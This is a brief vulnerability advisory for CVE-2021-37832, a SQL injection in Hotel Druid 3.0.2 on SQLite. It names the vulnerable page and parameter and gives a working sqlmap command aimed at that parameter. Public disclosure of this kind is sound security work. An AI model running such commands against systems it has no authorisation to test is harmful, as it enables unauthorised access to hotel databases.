# CVE 2021-37832 Hotel Druid 3.0.2 SQL Injection Vulnerability

A SQL injection vulnerability exists in version 3.0.2 of Hotel Druid when SQLite is being used as the application database. A malicious attacker can issue SQL commands to the SQLite database through the vulnerable idappartamenti parameter.

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37832

https://nvd.nist.gov/vuln/detail/CVE-2021-37832#match-6858716

Vulnerable PHP Page:

modifica_app.php - idappartamenti parameter

Vulnerable Payload

sqlmap -u "<ipaddress>/modifica_app.php?tipo_tabella=appartamenti&anno=2021&id_sessione=&idappartamenti=01" --level=3 --risk=2 --banner --dbms=sqlite

Discovered by Joe Helle, July 2021
